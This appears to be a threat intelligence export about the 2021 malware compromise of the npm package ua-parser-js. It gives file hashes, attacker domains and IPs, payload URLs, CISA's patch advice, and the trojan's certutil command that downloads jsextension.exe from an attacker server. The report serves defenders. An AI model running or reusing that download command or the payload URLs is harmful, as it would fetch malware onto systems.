# Threat Report: 2021-10-24: Malware Discovered in Popular NPM Package, ua-parser-js


## Key Intelligence
* Date: 2021-10-24
* Threat Level: 2 (Medium)
* Tags: type:OSINT, osint:lifetime="perpetual", osint:certainty="50", tlp:white, misp-galaxy:mitre-attack-pattern="Compromise Software Supply Chain - T1195.002", misp-galaxy:mitre-attack-pattern="Compromise Software Dependencies and Development Tools - T1195.001"

---

## Indicators of Compromise (IOCs)
### Artifacts dropped
* sha256: <sha256> — sdd.dll
* sha256: <sha256> — jsextension.exe

### External analysis
* link: https://github.com/advisories/GHSA-pjwm-rvh2-c87w
* link: https://github.com/faisalman/ua-parser-js/issues/536

### Network activity
* domain: citationsherbe.at

### Payload delivery
* url: http://159.148.186.228/download/jsextension.exe
* url: https://citationsherbe.at/sdd.dll

## Objects
### report — Metadata used to generate an executive level report
* [External analysis] link: https://us-cert.cisa.gov/ncas/current-activity/2021/10/22/malware-discovered-popular-npm-package-ua-parser-js
* [Other] text: Versions of a popular NPM package named ua-parser-js was found to contain malicious code. ua-parser-js is used in apps and websites to discover the type of device or browser a person is using from User-Agent data. A computer or device with the affected software installed or running could allow a remote attacker to obtain sensitive information or take control of the system. 

CISA urges users and administers using compromised ua-parser-js versions 0.7.29, 0.8.0, and 1.0.0 to update to the respective patched versions: 0.7.30, 0.8.1, 1.0.1   

For more information, see Embedded malware in ua-parser-js.
* [Other] text: Alert

### command-line — Command line and option related to a software malicious or not to execute specific commands.
* [Other] text: certutil -rulcache -f http://159.148.186.228/download/jsextension.exe jsextension.exe
* [Other] text: The trojan try to execute in the cmd

### command-line — Command line and option related to a software malicious or not to execute specific commands.
* [Other] text: npm show ua-parser-js time
* [Other] text: To check the time when the package was installed

### domain-ip — A domain/hostname and IP address seen as a tuple in a specific time frame.
* [Network activity] domain: citationsherbe.at
* [Network activity] ip-dst: 95.213.165.20

### domain-ip — A domain/hostname and IP address seen as a tuple in a specific time frame.
* [Network activity] ip-dst: 159.148.186.228

### file — File object describing a file with meta-information
* [Payload installation] pattern-in-file: ua-parser-js

### file — File object describing a file with meta-information
* [Artifacts dropped] md5: <md5> — sdd.dll
* [Artifacts dropped] sha1: <sha1> — sdd.dll
* [Artifacts dropped] sha256: <sha256> — sdd.dll

### virustotal-report — VirusTotal report
* [Other] datetime: 2021-10-24T04:03:55+00:00 — sdd.dll
* [External analysis] link: https://www.virustotal.com/gui/file/2a3acdcd76575762b18c18c644a745125f55ce121f742d2aad962521bc7f25fd/detection/f-2a3acdcd76575762b18c18c644a745125f55ce121f742d2aad962521bc7f25fd-1635048235 — sdd.dll
* [Artifacts dropped] text: 23/50 — sdd.dll
